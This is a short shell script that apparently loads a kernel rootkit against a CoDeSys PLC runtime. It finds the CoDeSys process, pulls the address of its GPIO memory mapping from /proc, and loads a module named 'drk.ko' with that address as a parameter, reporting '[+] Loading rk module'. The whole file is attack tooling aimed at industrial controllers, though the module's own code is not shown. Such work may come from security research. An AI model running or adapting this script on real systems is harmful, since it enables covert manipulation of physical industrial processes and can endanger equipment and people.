#!/bin/sh

cspid=`pidof codesyscontrol.bin | cut -d' ' -f 1`
gpiobase=`cat /proc/$cspid/maps | grep /dev/mem | cut -d'-' -f 1 | cut -d' ' -f 1`

if pgrep "codesys" > /dev/null
then
	echo "[+] Looking for PLC Process... CoDeSys Detected"
else
	echo "[-] Looking for PLC Process... FAILED!"
fi

insmod drk.ko gpioB=0x$gpiobase
if [ $? = 0 ]
then
	echo "[+] Loading rk module... Done"
else
	echo "[-] Loading rk module... FAILED!"
fi
